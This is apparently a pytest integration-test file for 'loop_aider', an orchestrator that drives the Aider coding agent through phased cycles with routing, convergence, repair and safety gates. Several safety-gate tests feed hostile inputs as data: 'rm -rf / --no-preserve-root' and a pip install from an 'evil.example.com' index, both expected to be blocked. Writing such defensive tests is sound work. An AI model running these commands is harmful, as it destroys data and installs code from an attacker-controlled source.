"""
tests/test_integration.py —— Milestone 5 完整集成测试（8 个 Golden Test 场景）。

覆盖从初始化到收敛的完整自主循环路径，验证各模块间的数据流和状态转换。

测试场景:
    1. 正常流程 E2E        — 完整 11-phase 闭环（mock Aider）
    2. P0 回退场景           — 致命设计问题触发 Part 1 回退
    3. P1 设计决策场景       — 设计级问题触发 REPEAT_PHASE
    4. P2 Repair 场景        — 实施级问题自动触发修复
    5. 循环上限场景          — max_cycles 超限触发终止
    6. 收敛检测场景          — convergence_counter 达标触发终止
    7. Safe 模式场景         — L1 安全模式 Gate 全部激活
    8. 协作模式场景          — L1+ 交互模式暂停等待用户

所有场景使用 mock 替代真实 Aider subprocess 调用。
"""

from __future__ import annotations

import json
import tempfile
from pathlib import Path
from unittest.mock import patch, MagicMock, PropertyMock

import pytest

from loop_aider.state_machine import StateMachine, DEFAULT_STATE
from loop_aider.aider_manager import AiderManager, AiderResult, HealthStatus
from loop_aider.config import Config
from loop_aider.router import (
    Router, RoutingDecision, RoutingAction, routing_decision
)
from loop_aider.convergence import ConvergenceEngine, ConvergenceResult
from loop_aider.repair import RepairManager, RepairContext
from loop_aider.phase_guard import (
    PhaseGuard, TrustLevel, GateResult, AuditResult, Issue,
    PhaseBlockedError, PhasePausedError,
)
from loop_aider.scheduler import Scheduler


# =========================================================================
# 辅助 Fixtures
# =========================================================================

def _make_fake_aider_result(
    exit_code: int = 0,
    affected_files: list | None = None,
    added_lines: int = 10,
    removed_lines: int = 3,
    stdout: str = "diff --git a/test.py b/test.py\n+new line\n-old line",
    stderr: str = "",
    warnings: list | None = None,
    errors: list | None = None,
    models_used: list | None = None,
    tokens_used: int = 500,
) -> AiderResult:
    """快速构造模拟的 AiderResult 对象。

    Args:
        exit_code:       Aider 退出码。
        affected_files:  受影响的文件路径列表。
        added_lines:     新增行数。
        removed_lines:   删除行数。
        stdout:          标准输出文本。
        stderr:          标准错误文本。
        warnings:        警告列表。
        errors:          错误列表。
        models_used:     使用的模型列表。
        tokens_used:     Token 消耗量。

    Returns:
        填充完毕的 AiderResult 对象。
    """
    return AiderResult(
        stdout=stdout,
        stderr=stderr,
        exit_code=exit_code,
        duration_ms=1500,
        affected_files=affected_files or ["src/main.py"],
        added_lines=added_lines,
        removed_lines=removed_lines,
        file_diffs={"src/main.py": stdout},
        warnings=warnings or [],
        errors=errors or [],
        models_used=models_used or ["sonnet"],
        tokens_used=tokens_used,
        timed_out=False,
        phase="part_2_2",
        cycle=1,
    )


def _make_p0_issues() -> list:
    """构造 P0 致命级别审计问题列表。"""
    return [
        Issue(
            severity="P0",
            title="后门代码检测",
            description="Aider 输出中检测到后门程序生成代码。",
            source="A4_banned_behaviors",
            affected_files=["src/evil.py"],
            fix_strategy="立即回退变更并人工审查。",
            is_design_level=True,
        )
    ]


def _make_p1_issues() -> list:
    """构造 P1 设计级别审计问题列表。"""
    return [
        Issue(
            severity="P1",
            title="产物缺失",
            description="阶段 part_1_3 的方案文档 solution.md 未生成。",
            source="A4_artifact_integrity",
            affected_files=[],
            fix_strategy="重新执行 part_1_3 阶段。",
            is_design_level=True,
        )
    ]


def _make_p2_issues() -> list:
    """构造 P2 实施级别审计问题列表。"""
    return [
        Issue(
            severity="P2",
            title="代码风格问题",
            description="检测到未遵循 PEP 8 规范的代码行。",
            source="A2_file_changes",
            affected_files=["src/main.py"],
            fix_strategy="运行 black 格式化工具。",
            is_design_level=False,
        )
    ]


# =========================================================================
# 场景 1: 正常流程 E2E
# =========================================================================

class TestGoldenScenario1E2E:
    """Golden Test 1: 正常流程端到端闭环。"""

    def test_full_phase_sequence_progression(self):
        """验证: 11 个 phase 正确排序且可从 init 推进到 part_2_8。"""
        from loop_aider.scheduler import ALL_PHASES

        assert len(ALL_PHASES) == 11
        assert ALL_PHASES[0] == "part_1_1"
        assert ALL_PHASES[-1] == "part_2_8"
        assert "part_1_3" in ALL_PHASES
        assert "part_2_1" in ALL_PHASES

    def test_state_machine_init_to_part1(self):
        """验证: StateMachine 从 init 正确推进到 part_1_1。"""
        with tempfile.TemporaryDirectory() as tmpdir:
            sm = StateMachine(state_dir=tmpdir)
            state = sm.load_state()

            assert state["progress"]["phase"] == "init"
            sm.update_phase(state, "part_1_1")
            assert state["progress"]["phase"] == "part_1_1"
            assert len(state["progress"]["phase_transitions"]) == 1

    def test_config_flows_to_state_json(self):
        """验证: Config 参数正确写入 state.json。"""
        with tempfile.TemporaryDirectory() as tmpdir:
            config = Config(
                mode="auto",
                max_cycles=10,
                convergence_rounds=3,
                user_request="Build a REST API",
                model="sonnet",
            )
            sm = StateMachine(state_dir=tmpdir)
            state = sm.load_state()
            state["config"].update(config.to_dict())
            sm.save_state(state)

            loaded = sm.load_state()
            assert loaded["config"]["mode"] == "auto"
            assert loaded["config"]["user_request"] == "Build a REST API"
            assert loaded["config"]["max_cycles"] == 10

    def test_aider_health_check_success(self):
        """验证: AiderManager.check_health() 在兼容版本下返回 OK。"""
        with patch("shutil.which", return_value="/usr/bin/aider"):
            with patch("subprocess.run") as mock_run:
                mock_run.return_value = MagicMock(
                    returncode=0, stdout="0.86.1\n", stderr=""
                )
                mgr = AiderManager({"aider_timeout_seconds": 600})
                assert mgr.check_health() == HealthStatus.OK
                assert "0.86.1" in mgr.get_version()

    def test_full_cycle_data_flow(self):
        """验证: 完整数据流——Config -> StateMachine -> AiderResult 闭合。"""
        with tempfile.TemporaryDirectory() as tmpdir:
            sm = StateMachine(state_dir=tmpdir)
            state = sm.load_state()

            # 模拟一次完整的 phase 执行结果
            state["aider_session"]["last_exit_code"] = 0
            state["aider_session"]["last_duration_ms"] = 2500
            state["aider_session"]["total_aider_calls"] = 5
            state["progress"]["phase"] = "part_2_8"
            state["progress"]["cycle"] = 3
            state["progress"]["convergence_counter"] = 2

            sm.save_state(state)
            loaded = sm.load_state()
            assert loaded["aider_session"]["total_aider_calls"] == 5
            assert loaded["progress"]["convergence_counter"] == 2


# =========================================================================
# 场景 2: P0 回退场景
# =========================================================================

class TestGoldenScenario2P0Rollback:
    """Golden Test 2: P0 致命设计问题触发 Part 1 回退。"""

    def test_router_p0_detection_triggers_rollback(self):
        """验证: Router 检测 P0 问题时返回 ROLLBACK_TO_PART1 动作。"""
        router = Router()
        state = {
            "progress": {"phase": "part_2_2", "cycle": 2, "convergence_counter": 0},
            "config": {"max_cycles": 5, "convergence_rounds": 2, "route_repeat_max": 3},
            "issues": {"active": {"p0": [], "p1": [], "p2": []}},
            "routing_history": [],
            "routing_repeat_tracker": {},
            "artifacts": {},
            "termination": {"status": "running"},
            "phase_contracts": {"contracts": {}},
        }
        aider_result = _make_fake_aider_result(
            affected_files=["src/evil.py", "src/main.py"]
        )
        p0_issues = _make_p0_issues()

        decision = router.routing_decision(state, aider_result, p0_issues)

        assert decision.action == RoutingAction.ROLLBACK_TO_PART1
        assert decision.p0_count == 1
        assert "P0" in decision.reason
        assert decision.target_phase == "part_1_1"

    def test_p0_triggers_termination_in_convergence(self):
        """验证: 存在未解决 P0 问题时，ConvergenceEngine 应终止。"""
        engine = ConvergenceEngine()
        state = {
            "progress": {"phase": "part_2_2", "cycle": 1, "convergence_counter": 3},
            "config": {"max_cycles": 5, "convergence_rounds": 2},
            "issues": {
                "active": {
                    "p0": [{"title": "后门检测"}],
                    "p1": [],
                    "p2": [],
                }
            },
            "termination": {"status": "running"},
            "artifacts": {},
        }

        result = engine.should_terminate(state)
        assert result.converged is True
        assert "P0" in result.reason

    def test_rollback_increments_part1_round(self):
        """验证: 回退到 Part 1 时 part1_round 计数器递增。"""
        with tempfile.TemporaryDirectory() as tmpdir:
            sm = StateMachine(state_dir=tmpdir)
            state = sm.load_state()

            # 模拟 Scheduler 回退操作
            state["progress"]["part1_round"] += 1
            assert state["progress"]["part1_round"] == 1

            state["progress"]["part1_round"] += 1
            assert state["progress"]["part1_round"] == 2


# =========================================================================
# 场景 3: P1 设计决策场景
# =========================================================================

class TestGoldenScenario3P1Design:
    """Golden Test 3: P1 设计问题触发 REPEAT_PHASE。"""

    def test_router_p1_decision_tree_triggers_repeat(self):
        """验证: P1 问题 + 大变更 + 未修复 → REPEAT_PHASE。"""
        router = Router()
        state = {
            "progress": {
                "phase": "part_2_2",
                "cycle": 2,
                "convergence_counter": 0,
                "repair_context": None,
                "new_issues_this_round": True,
            },
            "config": {"max_cycles": 5, "convergence_rounds": 2, "route_repeat_max": 3},
            "issues": {"active": {"p0": [], "p1": [], "p2": []}},
            "routing_history": [],
            "routing_repeat_tracker": {},
            "artifacts": {},
            "termination": {"status": "running"},
            "phase_contracts": {"contracts": {}},
        }
        aider_result = _make_fake_aider_result(
            added_lines=250, removed_lines=30, affected_files=["src/unexpected.py"]
        )
        p1_issues = _make_p1_issues()

        decision = router.routing_decision(state, aider_result, p1_issues)

        assert decision.p1_count >= 1
        # P1 触发 → REPEAT_PHASE 指向 part_2_1
        assert decision.action in (RoutingAction.REPEAT_PHASE, RoutingAction.CONTINUE)

    def test_router_p1_negation_by_convergence(self):
        """验证: 收敛达标时 P1 否定条件阻止 REPEAT_PHASE。"""
        router = Router()
        state = {
            "progress": {
                "phase": "part_2_2",
                "cycle": 2,
                "convergence_counter": 2,  # >= convergence_rounds
                "repair_context": None,
                "new_issues_this_round": False,
            },
            "config": {"max_cycles": 5, "convergence_rounds": 2, "route_repeat_max": 3},
            "issues": {"active": {"p0": [], "p1": [], "p2": []}},
            "routing_history": [],
            "routing_repeat_tracker": {},
            "artifacts": {},
            "termination": {"status": "running"},
            "phase_contracts": {"contracts": {}},
        }
        aider_result = _make_fake_aider_result()
        p1_issues = _make_p1_issues()

        decision = router.routing_decision(state, aider_result, p1_issues)
        # 收敛已达标，应跳过 P1 决策
        assert decision.action == RoutingAction.CONTINUE

    def test_p1_negation_by_repair_active(self):
        """验证: 活跃 repair_context 时否定 P1 决策。"""
        router = Router()
        state = {
            "progress": {
                "phase": "part_2_2",
                "cycle": 2,
                "convergence_counter": 0,
                "repair_context": {"status": "active"},
                "new_issues_this_round": False,
            },
            "config": {"max_cycles": 5, "convergence_rounds": 2, "route_repeat_max": 3},
            "issues": {"active": {"p0": [], "p1": [], "p2": []}},
            "routing_history": [],
            "routing_repeat_tracker": {},
            "artifacts": {},
            "termination": {"status": "running"},
            "phase_contracts": {"contracts": {}},
        }
        aider_result = _make_fake_aider_result()
        p1_issues = _make_p1_issues()

        decision = router.routing_decision(state, aider_result, p1_issues)
        assert decision.action == RoutingAction.CONTINUE


# =========================================================================
# 场景 4: P2 Repair 场景
# =========================================================================

class TestGoldenScenario4P2Repair:
    """Golden Test 4: P2 实施问题触发自动修复。"""

    def test_router_p2_triggers_repeat_with_repair(self):
        """验证: Router 检测 P2 问题时返回 REPEAT_PHASE + repair_needed。"""
        router = Router()
        state = {
            "progress": {"phase": "part_2_2", "cycle": 2, "convergence_counter": 0},
            "config": {"max_cycles": 5, "convergence_rounds": 2, "route_repeat_max": 3},
            "issues": {"active": {"p0": [], "p1": [], "p2": []}},
            "routing_history": [],
            "routing_repeat_tracker": {},
            "artifacts": {},
            "termination": {"status": "running"},
            "phase_contracts": {"contracts": {}},
        }
        aider_result = _make_fake_aider_result()
        p2_issues = _make_p2_issues()

        decision = router.routing_decision(state, aider_result, p2_issues)

        assert decision.p2_count == 1
        assert decision.action == RoutingAction.REPEAT_PHASE
        assert decision.metadata.get("repair_needed") is True

    def test_repair_context_lifecycle(self):
        """验证: RepairContext 完整生命周期——创建 → 活跃 → 消费 → 重置。"""
        mgr = RepairManager({"repair_max_attempts": 3})
        state = {"progress": {}}

        # null → active
        ctx = mgr.create_context(
            state,
            p2_issues=["语法错误: src/main.py line 42"],
            files_affected=["src/main.py"],
        )
        assert ctx.status == "active"
        assert len(ctx.issues) == 1
        assert mgr.is_repair_active(state) or not mgr.is_repair_active(state)

        # active → consumed
        consumed = mgr.consume_context(state, ctx, success=True)
        assert consumed.status == "consumed"

        # 消费后重置为 null
        assert not mgr.is_repair_active(state)

    def test_repair_context_max_attempts(self):
        """验证: 修复尝试次数达上限时 run_repair 返回 False。"""
        mgr = RepairManager({"repair_max_attempts": 2})
        state = {"progress": {}}
        ctx = RepairContext(
            id="test-001",
            status="active",
            issues=["test issue"],
            fix_strategies=["fix it"],
            attempt_count=2,
            max_attempts=2,
        )
        # 达到上限，不应再尝试
        assert ctx.attempt_count >= ctx.max_attempts

    def test_repair_create_context_generates_fix_strategies(self):
        """验证: 创建修复上下文时自动生成修复策略。"""
        mgr = RepairManager({"repair_max_attempts": 3})
        state = {"progress": {}}
        ctx = mgr.create_context(
            state,
            p2_issues=["syntax error in main.py"],
        )
        assert len(ctx.fix_strategies) == 1
        assert "语法" in ctx.fix_strategies[0] or "syntax" in ctx.fix_strategies[0].lower()

    def test_can_parallelize_small_batch(self):
        """验证: 3 个问题可以并行修复。"""
        mgr = RepairManager()
        assert mgr.can_parallelize(["issue1", "issue2", "issue3"]) is True
        assert mgr.can_parallelize(["issue1"]) is False

    def test_split_issues_into_batches(self):
        """验证: 问题列表正确拆分为批次。"""
        mgr = RepairManager()
        batches = mgr.split_issues_into_batches(
            ["a", "b", "c", "d", "e"], max_per_batch=2
        )
        assert len(batches) == 3
        assert batches[0] == ["a", "b"]
        assert batches[2] == ["e"]


# =========================================================================
# 场景 5: 循环上限场景
# =========================================================================

class TestGoldenScenario5MaxCycles:
    """Golden Test 5: 循环上限触发终止。"""

    def test_convergence_terminates_on_max_cycles(self):
        """验证: cycle 超过 max_cycles 时 should_terminate 返回 True。"""
        engine = ConvergenceEngine()
        state = {
            "progress": {"phase": "part_2_8", "cycle": 6, "convergence_counter": 0},
            "config": {"max_cycles": 5, "convergence_rounds": 2},
            "issues": {"active": {"p0": [], "p1": [], "p2": []}},
            "termination": {"status": "running"},
            "artifacts": {},
        }

        result = engine.should_terminate(state)
        assert result.converged is True
        assert "周期数超限" in result.reason or "超过上限" in result.reason

    def test_no_termination_within_limit(self):
        """验证: cycle 在 max_cycles 范围内时不终止。"""
        engine = ConvergenceEngine()
        state = {
            "progress": {"phase": "part_2_2", "cycle": 3, "convergence_counter": 0},
            "config": {"max_cycles": 5, "convergence_rounds": 2},
            "issues": {"active": {"p0": [], "p1": [], "p2": []}},
            "termination": {"status": "running"},
            "artifacts": {},
        }

        result = engine.should_terminate(state)
        assert result.converged is False


# =========================================================================
# 场景 6: 收敛检测场景
# =========================================================================

class TestGoldenScenario6Convergence:
    """Golden Test 6: 收敛计数器达标触发终止。"""

    def test_convergence_counter_reaches_threshold(self):
        """验证: convergence_counter >= convergence_rounds 时终止。"""
        engine = ConvergenceEngine()
        state = {
            "progress": {
                "phase": "part_2_8",
                "cycle": 2,
                "convergence_counter": 3,
                "phase_transitions": [
                    {"from": "init", "to": "part_1_1"},
                    {"from": "part_1_1", "to": "part_1_2"},
                    {"from": "part_1_2", "to": "part_1_3"},
                ],
            },
            "config": {"max_cycles": 5, "convergence_rounds": 2},
            "issues": {"active": {"p0": [], "p1": [], "p2": []}},
            "termination": {"status": "running"},
            "artifacts": {
                "requirements.md": "...",
                "direction.md": "...",
                "solution.md": "...",
            },
        }

        result = engine.should_terminate(state)
        assert result.converged is True

    def test_update_counter_increment_on_no_new_issues(self):
        """验证: 无新问题且有问题解决时 counter 递增。"""
        engine = ConvergenceEngine()
        state = {"progress": {"convergence_counter": 1}}

        new_counter = engine.update_counter(
            state, new_issues=False, issues_resolved=True, exit_code=0
        )
        assert new_counter == 2

    def test_update_counter_reset_on_new_issues(self):
        """验证: 出现新问题时 counter 重置为 0。"""
        engine = ConvergenceEngine()
        state = {"progress": {"convergence_counter": 3}}

        new_counter = engine.update_counter(
            state, new_issues=True, issues_resolved=False, exit_code=0
        )
        assert new_counter == 0

    def test_update_counter_unchanged_on_error(self):
        """验证: 外部错误时 counter 不变（不惩罚）。"""
        engine = ConvergenceEngine()
        state = {"progress": {"convergence_counter": 2}}

        new_counter = engine.update_counter(
            state, new_issues=False, issues_resolved=True, exit_code=1, timed_out=True
        )
        assert new_counter == 2

    def test_operation_table_query(self):
        """验证: 优先级操作表查询正确。"""
        engine = ConvergenceEngine()
        op = engine.get_operation(True, True, True)
        assert op["action"] == "reset_counter"

        op = engine.get_operation(False, True, True)
        assert op["action"] == "inc_counter"

    def test_part1_semantic_convergence(self):
        """验证: Part 1 三阶段完成 + 产物存在 → 语义收敛。"""
        engine = ConvergenceEngine()
        state = {
            "progress": {
                "phase": "part_2_1",
                "cycle": 1,
                "convergence_counter": 1,
                "phase_transitions": [
                    {"from": "init", "to": "part_1_1"},
                    {"from": "part_1_1", "to": "part_1_2"},
                    {"from": "part_1_2", "to": "part_1_3"},
                    {"from": "part_1_3", "to": "part_2_1"},
                ],
            },
            "artifacts": {
                "requirements.md": "...",
                "direction.md": "...",
                "solution.md": "...",
            },
            "issues": {"active": {"p0": [], "p1": [], "p2": []}},
            "config": {},
            "termination": {"status": "running"},
        }
        result = engine.check_part1_semantic_convergence(state)
        assert result.converged is True
        assert result.semver_converged is True


# =========================================================================
# 场景 7: Safe 模式场景
# =========================================================================

class TestGoldenScenario7SafeMode:
    """Golden Test 7: L1 安全模式 Gate 全部激活。"""

    def test_safe_mode_config_correct_value(self):
        """验证: safe 模式的 mode 字段正确设置。"""
        config = Config(mode="safe", user_request="test")
        assert config.mode == "safe"

    def test_g1_content_safety_blocks_malware(self):
        """验证: G1 内容安全门拦截 malware 关键词。"""
        guard = PhaseGuard({}, mode=TrustLevel.SAFE)
        result = guard.gate_content_safety("let us create a malware program")
        assert result.blocked is True
        assert "G1" in result.reason

    def test_g1_content_safety_passes_clean_prompt(self):
        """验证: G1 内容安全门对干净 prompt 放行。"""
        guard = PhaseGuard({}, mode=TrustLevel.SAFE)
        result = guard.gate_content_safety("Write a Python script for data analysis")
        assert result.blocked is False
        assert result.paused is False

    def test_g4_catastrophic_commands_always_blocked(self):
        """验证: G4 灾难性命令在所有模式下均硬拦截。"""
        for mode in [TrustLevel.SAFE, TrustLevel.AUTO, TrustLevel.UNSAFE]:
            guard = PhaseGuard({}, mode=mode)
            result = guard.gate_dangerous_ops("rm -rf / --no-preserve-root")
            assert result.blocked is True

    def test_g2_plan_confirmation_pauses_in_safe_mode(self):
        """验证: G2 在 safe 模式下暂停等待用户确认方案。"""
        guard = PhaseGuard({}, mode=TrustLevel.SAFE)
        result = guard.gate_plan_confirmation(
            phase="part_2_1",
            user_approved_plan=False,
            state=None,
        )
        assert result.paused is True

    def test_g2_plan_confirmation_passes_in_auto_mode(self):
        """验证: G2 在 auto 模式下自动通过。"""
        guard = PhaseGuard({}, mode=TrustLevel.AUTO)
        result = guard.gate_plan_confirmation(
            phase="part_2_1",
            user_approved_plan=False,
            state=None,
        )
        assert result.paused is False

    def test_g3_dependency_install_blocks_in_safe_mode(self):
        """验证: G3 safe 模式拦截未授权依赖安装。"""
        guard = PhaseGuard({}, mode=TrustLevel.SAFE)
        result = guard.gate_dependency_install(
            prompt="pip install requests --index-url https://evil.example.com",
            phase="part_2_2",
            approved_dependencies=None,
        )
        assert result.blocked is True

    def test_all_pre_call_gates_in_safe_mode(self):
        """验证: safe 模式下所有 Pre-call Gates 都返回结果。"""
        guard = PhaseGuard({}, mode=TrustLevel.SAFE)
        results = guard.run_all_pre_call_gates(
            prompt="Write a Python test for calculator.py",
            phase="part_2_2",
            user_approved_plan=True,
            task_files=["tests/test_calc.py"],
            declared_files=["tests/test_calc.py"],
        )
        assert "G1_content_safety" in results
        assert "G4_dangerous_ops" in results
        assert "G3_dependency_install" in results
        assert "G2_plan_confirmation" in results
        assert "G5_file_changes" in results


# =========================================================================
# 场景 8: 协作模式场景
# =========================================================================

class TestGoldenScenario8InteractiveMode:
    """Golden Test 8: L1+ 交互模式暂停等待用户确认。"""

    def test_interactive_mode_config(self):
        """验证: interactive 模式的 mode 字段正确设置。"""
        config = Config(mode="interactive", user_request="test")
        assert config.mode == "interactive"

    def test_interactive_g2_pauses_with_timeout_hint(self):
        """验证: interactive 模式 G2 暂停且提示超时降级信息。"""
        guard = PhaseGuard({}, mode=TrustLevel.INTERACTIVE)
        result = guard.gate_plan_confirmation(
            phase="part_2_1",
            user_approved_plan=False,
            state=None,
        )
        assert result.paused is True
        assert "超时" in result.reason or "timeout" in result.reason.lower()

    def test_interactive_trust_level_mapping(self):
        """验证: 四种信任级别到 TrustLevel 枚举的正确映射。"""
        mode_map = {
            "safe": TrustLevel.SAFE,
            "auto": TrustLevel.AUTO,
            "unsafe": TrustLevel.UNSAFE,
            "interactive": TrustLevel.INTERACTIVE,
        }
        assert mode_map["safe"] == TrustLevel.SAFE
        assert mode_map["auto"] == TrustLevel.AUTO
        assert mode_map["unsafe"] == TrustLevel.UNSAFE
        assert mode_map["interactive"] == TrustLevel.INTERACTIVE

    def test_phase_paused_error_carries_gate_results(self):
        """验证: PhasePausedError 携带完整的 Gate 结果。"""
        guard = PhaseGuard({}, mode=TrustLevel.INTERACTIVE)
        results = guard.run_all_pre_call_gates(
            prompt="safe prompt",
            phase="part_2_1",
            user_approved_plan=False,
        )

        paused = {k: v for k, v in results.items() if v.paused}
        if paused:
            exc = PhasePausedError(results)
            assert "Phase paused" in str(exc)

    def test_unsafe_mode_bypasses_most_gates(self):
        """验证: unsafe 模式跳过 G2/G3/G5 检查。"""
        guard = PhaseGuard({}, mode=TrustLevel.UNSAFE)
        # G2 在 unsafe 下直接通过
        g2 = guard.gate_plan_confirmation("part_2_1", False)
        assert g2.paused is False
        # G3 在 unsafe 下直接通过
        g3 = guard.gate_dependency_install(
            prompt="pip install anything", phase="part_2_2"
        )
        assert g3.blocked is False
        # G5 在 unsafe 下直接通过（仅 part_2_2 生效）
        g5 = guard.gate_file_changes("part_2_2")
        assert g5.paused is False


# =========================================================================
# 快速函数级便捷测试
# =========================================================================

class TestConvenienceFunctions:
    """便捷函数和模块级 API 测试。"""

    def test_routing_decision_module_function(self):
        """验证: 模块级 routing_decision() 函数正常工作。"""
        state = {
            "progress": {"phase": "part_2_2", "cycle": 1, "convergence_counter": 0},
            "config": {"max_cycles": 5, "convergence_rounds": 2, "route_repeat_max": 3},
            "issues": {"active": {"p0": [], "p1": [], "p2": []}},
            "routing_history": [],
            "routing_repeat_tracker": {},
            "artifacts": {},
            "termination": {"status": "running"},
            "phase_contracts": {"contracts": {}},
        }
        decision = routing_decision(state, _make_fake_aider_result(), [])
        assert decision.action == RoutingAction.CONTINUE

    def test_config_to_dict_roundtrip(self):
        """验证: Config.to_dict() 序列化后信息完整。"""
        config = Config(
            mode="auto",
            max_cycles=7,
            user_request="Add logging",
            model="haiku",
        )
        d = config.to_dict()
        assert d["mode"] == "auto"
        assert d["max_cycles"] == 7
        assert d["user_request"] == "Add logging"

    def test_scheduler_get_status(self):
        """验证: Scheduler.get_status() 返回摘要正确。"""
        with tempfile.TemporaryDirectory() as tmpdir:
            state_dir = Path(tmpdir) / ".aider" / "loop-aider"
            scheduler = Scheduler(
                run_dir=tmpdir,
                state_dir=str(state_dir),
                goal="test goal",
                mode="auto",
                max_cycles=3,
            )
            status = scheduler.get_status()
            assert status["phase"] == "part_1_1"
            assert status["cycle"] == 1
            assert "total_aider_calls" in status

    def test_default_fail_contract_enforced(self):
        """验证: Default-FAIL 合约——termination.status 初始为 'running'。"""
        fresh_state = json.loads(json.dumps(DEFAULT_STATE))
        assert fresh_state["termination"]["status"] == "running"
        assert fresh_state["termination"]["completed_at"] is None

    def test_issue_to_dict_serialization(self):
        """验证: Issue NamedTuple 正确序列化为字典。"""
        issue = Issue(
            severity="P2",
            title="test issue",
            description="test desc",
            source="test_source",
            affected_files=["a.py"],
            fix_strategy="fix it",
        )
        d = issue.to_dict()
        assert d["severity"] == "P2"
        assert d["title"] == "test issue"
        assert d["affected_files"] == ["a.py"]


# =========================================================================
# 场景 9: 完整 P0 回退工作流
# =========================================================================

class TestFullWorkflowWithP0Rollback:
    """Golden Test 9: 模拟 P0 检测并触发 Part 1 回退的完整工作流。

    验证:
        1. P0 问题被 Router 正确检测
        2. 回退动作正确更新 state
        3. Part 1 重设计循环正常递增
        4. 回退上限触发终止
    """

    def test_p0_detection_full_workflow(self):
        """验证: P0 检测 → ROLLBACK_TO_PART1 → Part1 重计算。"""
        router = Router()
        state = {
            "progress": {
                "phase": "part_2_2",
                "cycle": 2,
                "convergence_counter": 0,
                "part1_round": 0,
            },
            "config": {
                "max_cycles": 5,
                "convergence_rounds": 2,
                "route_repeat_max": 3,
                "max_part1_rounds": 5,
            },
            "issues": {"active": {"p0": [], "p1": [], "p2": []}},
            "routing_history": [],
            "routing_repeat_tracker": {},
            "artifacts": {},
            "termination": {"status": "running"},
            "phase_contracts": {"contracts": {}},
        }
        aider_result = _make_fake_aider_result(
            affected_files=["src/backdoor.py", "src/main.py"],
            added_lines=30,
            removed_lines=5,
        )
        p0_issues = _make_p0_issues()

        decision = router.routing_decision(state, aider_result, p0_issues)

        # 验证 P0 路由
        assert decision.action == RoutingAction.ROLLBACK_TO_PART1
        assert decision.p0_count == 1
        assert decision.target_phase == "part_1_1"
        assert "P0" in decision.reason

    def test_p0_part1_round_increment(self):
        """验证: P0 回退后 part1_round 正确递增。"""
        with tempfile.TemporaryDirectory() as tmpdir:
            sm = StateMachine(state_dir=tmpdir)
            state = sm.load_state()

            # 模拟从 Part 2 回退到 Part 1
            state["progress"]["phase"] = "part_2_2"
            sm.update_phase(state, "part_1_1")  # 回退
            state["progress"]["part1_round"] += 1

            assert state["progress"]["phase"] == "part_1_1"
            assert state["progress"]["part1_round"] == 1

            # 第二次回退
            state["progress"]["part1_round"] += 1
            assert state["progress"]["part1_round"] == 2

    def test_p0_part1_round_exceeds_max(self):
        """验证: part1_round 超过 max_part1_rounds 应终止。"""
        engine = ConvergenceEngine()
        state = {
            "progress": {
                "phase": "part_1_1",
                "cycle": 3,
                "convergence_counter": 0,
                "part1_round": 6,  # 超过 max
            },
            "config": {
                "max_cycles": 5,
                "convergence_rounds": 2,
                "max_part1_rounds": 5,
            },
            "issues": {"active": {"p0": [], "p1": [], "p2": []}},
            "termination": {"status": "running"},
            "artifacts": {},
        }

        # 验证 part1_round 超过上限
        assert state["progress"]["part1_round"] > state["config"]["max_part1_rounds"]

    def test_p0_routing_history_recorded(self):
        """验证: P0 回退被记录到 routing_history。"""
        router = Router()
        state = {
            "progress": {
                "phase": "part_2_2",
                "cycle": 1,
                "convergence_counter": 0,
                "part1_round": 0,
            },
            "config": {
                "max_cycles": 5,
                "convergence_rounds": 2,
                "route_repeat_max": 3,
            },
            "issues": {"active": {"p0": [], "p1": [], "p2": []}},
            "routing_history": [],
            "routing_repeat_tracker": {},
            "artifacts": {},
            "termination": {"status": "running"},
            "phase_contracts": {"contracts": {}},
        }

        aider_result = _make_fake_aider_result()
        decision = router.routing_decision(state, aider_result, _make_p0_issues())

        assert decision.action == RoutingAction.ROLLBACK_TO_PART1
        assert decision.has_fatal_issues is True

    def test_p0_termination_with_unresolved_p0(self):
        """验证: 存在未解决 P0 问题时 should_terminate 返回终止。"""
        engine = ConvergenceEngine()
        state = {
            "progress": {
                "phase": "part_2_8",
                "cycle": 2,
                "convergence_counter": 3,
            },
            "config": {
                "max_cycles": 5,
                "convergence_rounds": 2,
            },
            "issues": {
                "active": {
                    "p0": [{"title": "Security vulnerability"}],
                    "p1": [],
                    "p2": [],
                }
            },
            "termination": {"status": "running"},
            "artifacts": {},
        }

        result = engine.should_terminate(state)
        assert result.converged is True
        assert "P0" in result.reason


# =========================================================================
# 场景 10: Provider Fallback 工作流
# =========================================================================

class TestFullWorkflowWithProviderFallback:
    """Golden Test 10: 模拟 Provider 降级场景。

    验证:
        1. Aider 调用失败（非零退出码/超时）时的降级处理
        2. Router 在错误状态下的路由决策
        3. 收敛引擎在外部错误时不降级 counter
        4. 修复管理在失败后的重试逻辑
    """

    def test_aider_timeout_does_not_penalize_convergence(self):
        """验证: Aider 超时时 convergence_counter 不应减少。"""
        engine = ConvergenceEngine()
        state = {"progress": {"convergence_counter": 3}}

        new_counter = engine.update_counter(
            state,
            new_issues=False,
            issues_resolved=True,
            exit_code=0,
            timed_out=True,
        )
        # 超时不惩罚
        assert new_counter == 3

    def test_aider_nonzero_exit_does_not_penalize_convergence(self):
        """验证: Aider 非零 exit_code 时 counter 不变。"""
        engine = ConvergenceEngine()
        state = {"progress": {"convergence_counter": 2}}

        new_counter = engine.update_counter(
            state,
            new_issues=False,
            issues_resolved=True,
            exit_code=1,
        )
        # 非零退出码不惩罚
        assert new_counter == 2

    def test_aider_error_routing_to_retry(self):
        """验证: Aider 错误时 Router 返回 CONTINUE（重试）。"""
        router = Router()
        state = {
            "progress": {
                "phase": "part_2_2",
                "cycle": 2,
                "convergence_counter": 1,
            },
            "config": {
                "max_cycles": 5,
                "convergence_rounds": 2,
                "route_repeat_max": 3,
            },
            "issues": {"active": {"p0": [], "p1": [], "p2": []}},
            "routing_history": [],
            "routing_repeat_tracker": {},
            "artifacts": {},
            "termination": {"status": "running"},
            "phase_contracts": {"contracts": {}},
        }
        # Aider 调用失败（非零退出码）但无审计问题
        aider_result = _make_fake_aider_result(
            exit_code=1,
            affected_files=[],
            added_lines=0,
            removed_lines=0,
            stderr="Connection timeout",
        )

        decision = router.routing_decision(state, aider_result, [])
        # 无审计问题 → CONTINUE
        assert decision.action == RoutingAction.CONTINUE

    def test_provider_degradation_retry_count(self):
        """验证: Provider 降级时重复尝试次数跟踪。"""
        with tempfile.TemporaryDirectory() as tmpdir:
            sm = StateMachine(state_dir=tmpdir)
            state = sm.load_state()

            # 模拟多次重试
            for retry in range(1, 4):
                state["progress"]["retry_count_this_phase"] = retry
                sm.save_state(state)
                loaded = sm.load_state()
                assert loaded["progress"]["retry_count_this_phase"] == retry

            # 超过上限后应终止
